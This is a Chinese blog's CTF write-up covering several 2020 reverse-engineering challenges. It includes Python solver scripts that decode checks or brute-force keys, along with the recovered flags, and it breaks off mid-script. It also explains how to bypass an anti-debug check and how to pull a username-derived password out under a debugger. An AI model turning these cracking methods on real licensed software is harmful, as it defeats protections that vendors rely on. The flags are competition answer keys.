<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"apeng.re","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.18.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="放假在家没事做，学习之余打打比赛，武汉加油 没AK逆向有点可惜，两题都差一点点">
<meta property="og:type" content="article">
<meta property="og:title" content="2020 新春抗疫公益赛">
<meta property="og:url" content="http://apeng.re/2020/02/24/2020gongyi/index.html">
<meta property="og:site_name" content="Apeng&#39;s blog">
<meta property="og:description" content="放假在家没事做，学习之余打打比赛，武汉加油 没AK逆向有点可惜，两题都差一点点">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2020-02-24T05:10:19.000Z">
<meta property="article:modified_time" content="2023-03-24T14:14:17.112Z">
<meta property="article:author" content="Apeng">
<meta property="article:tag" content="VM">
<meta property="article:tag" content="nisi">
<meta property="article:tag" content="信号量">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://apeng.re/2020/02/24/2020gongyi/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://apeng.re/2020/02/24/2020gongyi/","path":"/2020/02/24/2020gongyi/","title":"2020 新春抗疫公益赛"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>2020 新春抗疫公益赛 | Apeng's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="Apeng's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Apeng's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Reverse Everything</p>
      <img class="custom-logo-image" src="/uploads/custom-logo.png" alt="Apeng's blog">
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#reverse"><span class="nav-number">1.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#factory"><span class="nav-number">1.1.</span> <span class="nav-text">Factory</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strange_installer"><span class="nav-number">1.2.</span> <span class="nav-text">Strange_installer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#section"><span class="nav-number">1.3.</span> <span class="nav-text">42</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babymac"><span class="nav-number">1.4.</span> <span class="nav-text">babymac</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%83%E9%B8%A1%E7%A5%9E%E5%99%A8"><span class="nav-number">1.5.</span> <span class="nav-text">吃鸡神器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#code2"><span class="nav-number">1.6.</span> <span class="nav-text">code2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crackme"><span class="nav-number">1.7.</span> <span class="nav-text">CrackMe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easyencrypt"><span class="nav-number">1.8.</span> <span class="nav-text">EasyEncrypt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easyvm"><span class="nav-number">1.9.</span> <span class="nav-text">easyvm</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#analysis-of-viruses"><span class="nav-number">1.10.</span> <span class="nav-text">Analysis of viruses</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#veryeasyre"><span class="nav-number">1.11.</span> <span class="nav-text">veryeasyRE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn"><span class="nav-number">2.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#borrow-stack"><span class="nav-number">2.1.</span> <span class="nav-text">borrow stack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">3.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#code_in_morse"><span class="nav-number">3.1.</span> <span class="nav-text">code_in_morse</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto"><span class="nav-number">4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#simple_math"><span class="nav-number">4.1.</span> <span class="nav-text">simple_math</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#warm_up"><span class="nav-number">4.2.</span> <span class="nav-text">warm_up</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Apeng</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">30</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">59</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/Apeng7364" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Apeng7364" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i></a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:apeng622@gmail.com" title="E-Mail → mailto:apeng622@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/Apeng_7364" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Apeng_7364" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i></a>
      </span>
      <span class="links-of-author-item">
        <a href="/atom.xml" title="RSS → &#x2F;atom.xml" rel="noopener me"><i class="fa fa-rss fa-fw"></i></a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_nd.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          链接
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="/friends" title="&#x2F;friends">Friends</a>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://apeng.re/2020/02/24/2020gongyi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Apeng">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Apeng's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="2020 新春抗疫公益赛 | Apeng's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          2020 新春抗疫公益赛
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-02-24 13:10:19" itemprop="dateCreated datePublished" datetime="2020-02-24T13:10:19+08:00">2020-02-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-03-24 22:14:17" itemprop="dateModified" datetime="2023-03-24T22:14:17+08:00">2023-03-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF-writeup/" itemprop="url" rel="index"><span itemprop="name">CTF writeup</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF-writeup/2020/" itemprop="url" rel="index"><span itemprop="name">2020</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>放假在家没事做，学习之余打打比赛，武汉加油</p>
<p>没AK逆向有点可惜，两题都差一点点</p>
<span id="more"></span>
<h2 id="reverse">Reverse</h2>
<h3 id="factory">Factory</h3>
<p>用信号实现的vm，调试出算法</p>
<p>init_array中先获取命令行，在哈希一下对比一些哈希值。有一个哈希值会直接退出。测试一下如果用ida直接起程序调试会触发这个哈希值，可以打断点跳过或者直接附加到指定进程。</p>
<p>之后用sigaction函数绑定一些信号量对应的handler。</p>
<p>本题使用信号量实现进程通信，子进程读取opcode。getppid获取的进程号是父进程的，然后用kill触发对应的信号，父进程就进入各个handler了。调试的时候可以附加到父进程上，在每个handler下断点，可以一步一步看到每一步的行为。</p>
<p>算法比较简单。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cipher =  [<span class="number">0xAF</span>, <span class="number">0xD4</span>, <span class="number">0xB8</span>, <span class="number">0xBD</span>, <span class="number">0xBC</span>, <span class="number">0xB9</span>, <span class="number">0xFC</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xA1</span>, </span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0xFE</span>, <span class="number">0xF1</span>, <span class="number">0xE9</span>, <span class="number">0x0B</span>, <span class="number">0xF3</span>, <span class="number">0x22</span>, <span class="number">0x0F</span>, <span class="number">0x14</span>, <span class="number">0xE2</span>, </span><br><span class="line">  <span class="number">0xED</span>, <span class="number">0xE5</span>, <span class="number">0xE2</span>, <span class="number">0x1F</span>, <span class="number">0x56</span>, <span class="number">0x54</span>, <span class="number">0x4B</span>, <span class="number">0x3A</span>, <span class="number">0x7E</span>, <span class="number">0x3E</span>, </span><br><span class="line">  <span class="number">0x5A</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>, <span class="number">0x0B</span>, <span class="number">0x6B</span>, <span class="number">0x68</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x64</span>, <span class="number">0x07</span>, </span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x1D</span>][::-<span class="number">1</span>]</span><br><span class="line">tmp = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    cipher[i] ^= (<span class="number">0x40</span>+<span class="number">2</span>*i)</span><br><span class="line">    cipher[i] -= i</span><br><span class="line">    cipher[i] &amp;= <span class="number">0xff</span></span><br><span class="line">    cipher[i] ^= (<span class="number">0x20</span>+<span class="number">2</span>*i) </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cipher[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
<h3 id="strange_installer">Strange_installer</h3>
<p>nisi安装包。nisi的一直没找到什么工具，只好硬调。之前ogeek做过一个更难的nisi，再做这道更上手一些。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">plain = <span class="string">b&quot;gm`fzd787`7bb,g72d,592b,8`g1,cg96813e8d``|&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>*<span class="built_in">len</span>(plain))</span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line">t = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> plain:</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">1</span>:</span><br><span class="line">        flag+=<span class="built_in">bytes</span>([i-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="built_in">bytes</span>([i+<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;e696a6cc-f63e-483c-9af0-bf87902d9eaa&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="section">42</h3>
<p>看到这个题目就大概知道要干什么了，接下来找找具体怎么实现的。</p>
<p>输入flag后会根据格式拼接成一整个字符串。格式和uuid有点不一样，是7-4-4-4-11</p>
<p>拼接好后转hex是15个字节，异或字符串<code>3nder5tandf10@t</code>后五个一组异或一组常量，得到三个8字节，当成3个double计算立方和。异或常量的时候写死了高位，即数的顺序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">0xfee1de719a72c03a</span></span><br><span class="line">b = <span class="number">0x11dc3e557854bab</span></span><br><span class="line">c = <span class="number">0x2cc5907a8da94f</span></span><br><span class="line">xor1 = <span class="number">0xfee1deaf76bdf08f</span></span><br><span class="line">xor2 = <span class="number">0x011dc37d846f5f42</span></span><br><span class="line">xor3 = <span class="number">0x2cc5d914031d68</span></span><br><span class="line">a ^= xor1</span><br><span class="line">b ^= xor2</span><br><span class="line">c ^= xor3</span><br><span class="line">key = <span class="string">b&quot;3nder5tandf10@t&quot;</span></span><br><span class="line"></span><br><span class="line">ha = <span class="string">b&quot;&quot;</span></span><br><span class="line">hb = <span class="string">b&quot;&quot;</span></span><br><span class="line">hc = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    ha = <span class="built_in">bytes</span>([a&amp;<span class="number">0xff</span>]) + ha</span><br><span class="line">    a &gt;&gt;= <span class="number">8</span></span><br><span class="line">    hb = <span class="built_in">bytes</span>([b&amp;<span class="number">0xff</span>]) + hb</span><br><span class="line">    b &gt;&gt;= <span class="number">8</span></span><br><span class="line">    hc = <span class="built_in">bytes</span>([c&amp;<span class="number">0xff</span>]) + hc</span><br><span class="line">    c &gt;&gt;= <span class="number">8</span></span><br><span class="line">hs = ha+hb+hc</span><br><span class="line"></span><br><span class="line">res = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    res += <span class="built_in">bytes</span>([hs[i]^key[i]])</span><br><span class="line">res = res.<span class="built_in">hex</span>()</span><br><span class="line">res = <span class="string">&quot;flag&quot;</span>+ <span class="string">&quot;&#123;&quot;</span> + res[<span class="number">0</span>:<span class="number">7</span>] + <span class="string">&quot;-&quot;</span> + res[<span class="number">7</span>:<span class="number">11</span>] + <span class="string">&quot;-&quot;</span> + res[<span class="number">11</span>:<span class="number">15</span>] + <span class="string">&quot;-&quot;</span> + res[<span class="number">15</span>:<span class="number">19</span>] + <span class="string">&quot;-&quot;</span> + res[<span class="number">19</span>:] + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h3 id="babymac">babymac</h3>
<p>mac的obj-C程序，不过逻辑比较简单，静态很容易看出算法。</p>
<p>先乘和模得到一组32个常量。输入每四个字符转为一个int，每个int的每一bit乘上权重后求和为常量。</p>
<p>一开始以为不能爆破。想了一下可见字符一共96*96*96*96种，而且打表的话很快。</p>
<p>爆破求解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">t1 = [<span class="number">0x0000000000000001</span>, <span class="number">0x00000000000001FE</span>, <span class="number">0x0000000000001A79</span>, <span class="number">0x0000000000004940</span>, <span class="number">0x000000000000712F</span>, <span class="number">0x000000000000E1C5</span>, <span class="number">0x000000000001E866</span>, <span class="number">0x000000000003B85C</span>, <span class="number">0x00000000000760B0</span>, <span class="number">0x00000000000ED95D</span>, <span class="number">0x00000000001DB360</span>, <span class="number">0x00000000003B4D46</span>, <span class="number">0x000000000076A007</span>, <span class="number">0x0000000000ED528C</span>, <span class="number">0x0000000001DA9434</span>, <span class="number">0x0000000003B51CEA</span>, <span class="number">0x00000000076A592D</span>, <span class="number">0x000000000ED4AA88</span>, <span class="number">0x000000001DA951A4</span>, <span class="number">0x000000003B529EF7</span>, <span class="number">0x0000000076A55442</span>, <span class="number">0x00000000ED4AB07B</span>, <span class="number">0x00000001DA9560A0</span>, <span class="number">0x00000003B52AACC4</span>, <span class="number">0x000000076A5553D9</span>, <span class="number">0x0000000ED4AA997D</span>, <span class="number">0x0000001DA9553387</span>, <span class="number">0x0000003B52AA7EED</span>, <span class="number">0x00000076A554F324</span>, <span class="number">0x000000ED4AA9E5D7</span>, <span class="number">0x000001DA9553C9B2</span>, <span class="number">0x000003B52AA79A0C</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    t1[i]*=<span class="number">0x10A9FC70042</span></span><br><span class="line">    t1[i]%=<span class="number">0x682669BC19DB</span></span><br><span class="line">res = [<span class="number">0x00030970372813D2</span>, <span class="number">0x0002D3A89BCA52AC</span>, <span class="number">0x00031551E79154A2</span>, <span class="number">0x0002C522E9A5298A</span>, <span class="number">0x0002A61367C5C698</span>, <span class="number">0x000264491C01CAFD</span>, <span class="number">0x00026CA3A06C98B3</span>, <span class="number">0x0002DACBD12FB903</span>, <span class="number">0x0002E470707574E1</span>, <span class="number">0x000309E5DC39A9A7</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a</span>):</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        result += t1[<span class="number">31</span>-i] * (a &amp; <span class="number">1</span>)</span><br><span class="line">        a &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">a0 = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x80</span>)]</span><br><span class="line">fa0 = <span class="built_in">list</span>(<span class="built_in">map</span>(foo, a0))</span><br><span class="line"></span><br><span class="line">a1 = [i&lt;&lt;<span class="number">8</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x80</span>)]</span><br><span class="line">fa1 = <span class="built_in">list</span>(<span class="built_in">map</span>(foo, a1))</span><br><span class="line"></span><br><span class="line">a2 = [i&lt;&lt;<span class="number">16</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x80</span>)]</span><br><span class="line">fa2 = <span class="built_in">list</span>(<span class="built_in">map</span>(foo, a2))</span><br><span class="line"></span><br><span class="line">a3 = [i&lt;&lt;<span class="number">24</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x80</span>)]</span><br><span class="line">fa3 = <span class="built_in">list</span>(<span class="built_in">map</span>(foo, a3))</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">I = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(I)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x80</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x80</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x80</span>):</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x80</span>):</span><br><span class="line">                <span class="keyword">if</span> fa0[i-<span class="number">0x20</span>] + fa1[j-<span class="number">0x20</span>] + fa2[k-<span class="number">0x20</span>] + fa3[l-<span class="number">0x20</span>] == res[<span class="built_in">int</span>(I)]:</span><br><span class="line">                    s = <span class="built_in">chr</span>(i) + <span class="built_in">chr</span>(j) + <span class="built_in">chr</span>(k) + <span class="built_in">chr</span>(l)</span><br><span class="line">                    <span class="built_in">print</span>(s)</span><br><span class="line">                    exit()</span><br><span class="line"><span class="comment"># flag&#123;m3Rkl3_h3LLMaN_KNaPsacK_Al90R17Hm!&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="吃鸡神器">吃鸡神器</h3>
<p>根据用户名算了一个密码，直接调试断在0x4021d8，EAX为flag。</p>
<h3 id="code2">code2</h3>
<p>根据程序写出一样的算法，爆破出输入的key</p>
<p>刚开始爆破出8位key，结果不对。再继续爆破第九位出4个结果，其中一个为正确key</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0.33333334</span>,<span class="number">0.11111111</span>,<span class="number">0.22222222</span>,<span class="number">0.11111111</span>,<span class="number">0.11111111</span>,<span class="number">0.11111111</span>]</span><br><span class="line">b = [<span class="number">0.0</span>,<span class="number">0.33333334</span>,<span class="number">0.44444445</span>,<span class="number">0.66666669</span>,<span class="number">0.77777779</span>,<span class="number">0.8888889</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;8ab697&quot;</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># key1 = &quot;8ab86b8&quot;</span></span><br><span class="line">key1 = <span class="string">&quot;&quot;</span></span><br><span class="line">m = product(s, repeat = <span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    key2 = <span class="string">&quot;&quot;</span>.join(i)</span><br><span class="line">    key = key1+key2</span><br><span class="line">    v0 = <span class="number">0.0</span></span><br><span class="line">    v1 = <span class="number">1.0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">        v4 = <span class="number">0</span></span><br><span class="line">        v5 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> key[j]!=s[v5] :</span><br><span class="line">            v4+=<span class="number">1</span></span><br><span class="line">            v5+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> v4 &gt;= <span class="number">6</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> v4 &lt; <span class="number">6</span>:</span><br><span class="line">            v6 = v1</span><br><span class="line">            v1 *= a[v5]</span><br><span class="line">            v0 += v6*b[v5]</span><br><span class="line">    v7 = v0 - <span class="number">0.129556</span></span><br><span class="line">    <span class="keyword">if</span> v0 &gt;= <span class="number">0.130</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">abs</span>(v7) &lt; <span class="number">0.000001</span>:</span><br><span class="line">        <span class="built_in">print</span>(v0)</span><br><span class="line">        <span class="built_in">print</span>(key)</span><br><span class="line"><span class="comment"># 